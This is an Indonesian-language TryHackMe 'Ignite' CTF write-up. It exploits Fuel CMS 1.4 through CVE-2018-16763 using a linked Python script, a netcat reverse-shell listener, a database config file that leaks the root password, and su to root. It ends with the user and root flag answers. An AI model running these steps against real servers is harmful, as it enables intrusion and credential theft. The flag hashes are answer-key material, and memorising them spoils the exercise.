# Ignite
- TryHackMe Room: https://tryhackme.com/room/ignite
- IP Machine: 10.10.116.227

## Task 1 Root it!
- Scanning server menggunakan nmap. Disini hanya ada 1 port yang terbuka, yaitu port 80 (http)
```sh
nmap -sV -sC <IP_Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%201.JPG)

- Buka halaman web `http://<IP_Machine>` di browser. Disini terlihat bahwa halaman ini adalah halaman default fuel CMS versi 1.4

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%202.JPG)

- Di halaman tersebut terdapat informasi dimana letak file konfigurasi database

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%203.JPG)

- Di halaman tersebut juga terdapat informasi cara mengakses halaman admin dan default credential

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%204.JPG)

- Sekarang kita coba akses halaman admin dengan url `http://<IP_Machine>/fuel` dan kita langsung diarahkan ke halaman login. Sekarang kita isi username dan password dengan default credential diatas

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%205.JPG)

- Kita berhasil masuk ke halaman admin, tapi tidak ditemukan hal menarik disini

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%206.JPG)

- Berdasarkan riset, fuel CMS versi 1.4 rentan terhadap serangan Remote Code Execution ( CVE 2018-16763 )

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%207.JPG)

- Kita bisa memanfaatkan script python3 di link https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py untuk melakukan exploitasi pada fuel CMS versi 1.4
- Sekarang kita buat sebuah listener netcat di terminal baru
```sh
nc -lnvp <port>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%208.JPG)

- Jalankan script fuel-cms.py
```sh
python3 fuel-cms.py <IP_Machine>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%209.JPG)

- Ketik `shell_me` kemudian masukkan IP tun0 pada komputer anda lalu nomor port yang digunakan listener netcat tadi dengan format sebagai berikut
```sh
<IP_tun0>:<port>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2010.JPG)

- Disini listener netcat berhasil terkoneksi dengan server dan masuk sebagai user **www-data**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2011.JPG)

- Selanjutnya kita buka file konfigurasi database fuel CMS, disana terdapat nama user root dan password
```sh
cat fuel/application/config/database.php
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2012.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2013.JPG)

- Kita juga berhasil menemukan lokasi dan isi user flag
```sh
cat /home/www-data/flag.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2014.JPG)

- Untuk mengakses user root kita perlu mengubah shell menjadi terminal interaktif
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2015.JPG)

- Sekarang kita switch ke user root lalu masukkan password yang sudah ditemukan tadi. Disini kita berhasil mengakses user root
```sh
su root
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2016.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2017.JPG)

- Sekarang kita buka isi root flag
```sh
cat /root/root.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Ignite/assets/ign%2018.JPG)

- **Pertanyaan:** User.txt
- **Jawaban:**
```sh
6470e394cbf6dab6a91682cc8585059b
```
- **Pertanyaan:** Root.txt
- **Jawaban:**
```sh
b9bbcb33e11b80be759c4e844862482d
```